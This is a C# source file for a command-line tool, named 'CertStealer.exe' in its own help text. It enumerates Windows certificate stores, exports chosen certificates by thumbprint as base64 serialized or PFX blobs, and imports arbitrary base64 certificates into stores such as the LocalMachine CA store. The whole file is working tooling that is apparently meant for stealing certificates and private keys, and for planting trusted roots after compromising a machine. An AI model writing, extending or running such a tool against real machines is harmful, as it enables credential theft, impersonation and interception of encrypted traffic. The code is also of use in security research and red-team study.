using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using CommandLine;

public class Program
{

    public class Options
    {
        [Option('i', "import", Required = false, HelpText = "Import a serialized cert.")]
        public bool Import { get; set; }

        [Option('e', "export", Required = false, HelpText = "Export a serialized cert by its thumbprint.")]
        public bool Export { get; set; }

        [Option('l', "list", Required = false, HelpText = "Lists all certs, their details, and prints them in their serialized form.")]
        public bool List { get; set; }

        [Option('s', "store", Required = false, HelpText = "Confines a list to a specified store.")]
        public string Store { get; set; }

        [Option('n', "name", Required = false, HelpText = "Confines a list to a specified location.")]
        public string Location { get; set; }

        [Option('v', "verbose", Required = false, HelpText = "Verbose output.")]
        public bool Verbose { get; set; }

        [Option('h', "help", Required = false, Default = true, HelpText = "Display help message.")]
        public bool HelpMessage { get; set; }
    }

    static void Main(string[] args)
    {
        Parser.Default.ParseArguments<Options>(args)
                   .WithParsed<Options>(o =>
                   {
                       if (o.List)
                       {
                           string location = "";
                           string store = "";

                           if (!String.IsNullOrEmpty(o.Store))
                               store = o.Store;

                           if (!String.IsNullOrEmpty(o.Location))
                               location = o.Location;

                           List(o.Verbose, location, store);
                       }
                       else if (o.Export)
                       {
                           string type = "serialized";
                           string thumbprint = "";
                           if (args.Length >= 2)
                           {
                               if (args.Length >= 3)
                                   type = args[args.Length - 2];
                               thumbprint = args[args.Length - 1];

                               switch (type)
                               {
                                   case "serialized":
                                       Export(thumbprint, X509ContentType.SerializedCert);
                                       break;
                                   case "pfx":
                                       Export(thumbprint, X509ContentType.Pfx);
                                       break;
                               }

                           }
                       }
                       else if (o.Import)
                       {
                           string cert = "";
                           string storename = "My";
                           string location = "local";

                            if (args.Length >= 3)
                           {
                               cert = args[args.Length - 1];
                               location = args[args.Length - 2];
                               storename = args[args.Length - 3];

                               switch (location)
                               {
                                   case "local":
                                       Import(cert, storename, StoreLocation.LocalMachine, o.Verbose);
                                       break;
                                   case "user":
                                       Import(cert, storename, StoreLocation.CurrentUser, o.Verbose);
                                       break;
                               }
                           }  
                       }
                       else if (o.HelpMessage)
                           Help();
                   });
    }

    public static void List(bool verbose = false, string location = "", string name = "")
    {
        Console.WriteLine("\r\nExisting Certs Name and Location");
        Console.WriteLine("------ ----- -------------------------");

        StoreLocation loc = StoreLocation.LocalMachine;
        if (!String.IsNullOrEmpty(location))
        {
            switch (location)
            {
                case "local":
                    loc = StoreLocation.LocalMachine;
                    break;
                case "user":
                    loc = StoreLocation.CurrentUser;
                    break;
            }
        }

        foreach (StoreLocation storeLocation in (StoreLocation[])
            Enum.GetValues(typeof(StoreLocation)))
        {
            if (!String.IsNullOrEmpty(location) && storeLocation != loc)
                continue;

            foreach (StoreName storeName in (StoreName[])
                Enum.GetValues(typeof(StoreName)))
            {
                X509Store store = new X509Store(storeName, storeLocation);

                try
                {
                    store.Open(OpenFlags.OpenExistingOnly);

                    if (!String.IsNullOrEmpty(name) && store.Name != name)
                        continue;

                    Console.WriteLine("Yes    {0,4}  {1}, {2}",
                        store.Certificates.Count, store.Name, store.Location);
                }
                catch (CryptographicException)
                {
                    Console.WriteLine("No           {0}, {1}",
                        store.Name, store.Location);
                }
            }
            Console.WriteLine();
        }

        Console.WriteLine("\r\nAll Certificate Details");
        Console.WriteLine("------ ----- -------------------------");

        foreach (StoreLocation storeLocation in (StoreLocation[])
            Enum.GetValues(typeof(StoreLocation)))
        {

            if (!String.IsNullOrEmpty(location) && storeLocation != loc)
                continue;

            foreach (StoreName storeName in (StoreName[])
                Enum.GetValues(typeof(StoreName)))
            {
                X509Store store = new X509Store(storeName, storeLocation);

                try
                {
                    store.Open(OpenFlags.OpenExistingOnly);

                    if (!String.IsNullOrEmpty(name) && store.Name != name)
                        continue;

                    foreach (X509Certificate certificate in (store.Certificates))
                    {
                        Console.WriteLine("----------------------------------");
                        Console.WriteLine("Details:");
                        Console.WriteLine(certificate.ToString());


                        if (verbose)
                            Console.WriteLine(Convert.ToBase64String(certificate.Export(X509ContentType.SerializedCert)));

                        Console.WriteLine();
                    }
                }
                catch (CryptographicException ex)
                {
                    Console.WriteLine("Failed to export           {0}, {1} for cryptographic error.",
                        store.Name, store.Location);

                    Console.WriteLine("Error message: ");
                    Console.WriteLine(ex.Message);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Failed to import           {0}, {1} due to unknown error.",
                        store.Name, store.Location);

                    Console.WriteLine("Error message: ");
                    Console.WriteLine(ex.Message);
                }
            }
            Console.WriteLine();
        }
    }

    public static bool Export(string thumbprint, X509ContentType type)
    {
        foreach (StoreLocation storeLocation in (StoreLocation[])
            Enum.GetValues(typeof(StoreLocation)))
        {
            foreach (StoreName storeName in (StoreName[])
                Enum.GetValues(typeof(StoreName)))
            {
                X509Store store = new X509Store(storeName, storeLocation);

                try
                {
                    store.Open(OpenFlags.OpenExistingOnly);

                    foreach (X509Certificate2 certificate in (store.Certificates))
                    {
                        if (certificate.GetCertHashString() == thumbprint)
                        {
                            Console.WriteLine("Details: " + certificate.ToString());

                            string output = "";

                            if (type == X509ContentType.SerializedCert)
                                output = Convert.ToBase64String(certificate.Export(X509ContentType.SerializedCert));
                            else if (type == X509ContentType.Pfx)
                                output = Convert.ToBase64String(certificate.Export(X509ContentType.Pfx));

                            Console.WriteLine();
                            Console.WriteLine("Output Type: " + type);
                            Console.WriteLine(output);

                            return true;
                        }

                    }
                }
                catch (CryptographicException ex)
                {
                    Console.WriteLine("Failed to export           {0}, {1} for cryptographic error.",
                        store.Name, store.Location);

                    Console.WriteLine("Error message: ");
                    Console.WriteLine(ex.Message);

                    return false;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Failed to import           {0}, {1} due to unknown error.",
                        store.Name, store.Location);

                    Console.WriteLine("Error message: ");
                    Console.WriteLine(ex.Message);

                    return false;
                }
            }

            
        }
        return false;
    }

    
    public static bool Import(string cert, string storename, StoreLocation location, bool verbose = false)
    {
        X509Store store = new X509Store();

        try
        {
            X509Certificate2 certificate = new X509Certificate2();
            certificate.Import(Convert.FromBase64String(cert));

            Console.WriteLine("Certificate read successfully.");

            if (verbose)
                Console.WriteLine("Details: " + certificate.ToString());

            store  = new X509Store(storename, location);
            store.Open(OpenFlags.ReadWrite | OpenFlags.OpenExistingOnly);
            Console.WriteLine("Opened store: {0}", store.Name);

            store.Add(certificate);
            Console.WriteLine("Added certificate to store successfully!");
            store.Close();
            return true;
        }
        catch (CryptographicException ex)
        {
            Console.WriteLine("Failed to import           {0}, {1} for cryptographic error.",
                store.Name, store.Location);

            Console.WriteLine("Error message: ");
            Console.WriteLine(ex.Message);

            return false;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to import           {0}, {1} due to unknown error.",
                store.Name, store.Location);

            Console.WriteLine("Error message: ");
            Console.WriteLine(ex.Message);

            return false;
        }
    }
    public static void Help()
    {
        Console.WriteLine("Examples:\n");

        Console.WriteLine("Display this help message: CertStealer.exe --help");
        Console.WriteLine("Listing all certs: CertStealer.exe --list");
        Console.WriteLine("Listing all certs within the My store in CurrentUser: CertStealer.exe --name user --store My --list");
        Console.WriteLine("Listing all certs within the CA store in LocalMachine: CertStealer.exe --name local --store CA --list");
        Console.WriteLine("Exporting a cert by its thumbprint: CertStealer.exe -export AF724CB571166C24C0799E65BE4772B10814BDD2");
        Console.WriteLine("Exporting a cert by its thumbprint as PFX: CertStealer.exe -export pfx AF724CB571166C24C0799E65BE4772B10814BDD2");
        Console.WriteLine("Importing a cert into the My store in CurrentUser: CertStealer.exe --import My user Dw...snipped...gY=");
        Console.WriteLine("Importing a cert into the CA store in LocalMachine: CertStealer.exe --import CA local Dw...snipped...gY=");
        Console.WriteLine("Use verbose output (works for list and import): CertStealer.exe --list --verbose");
    }
}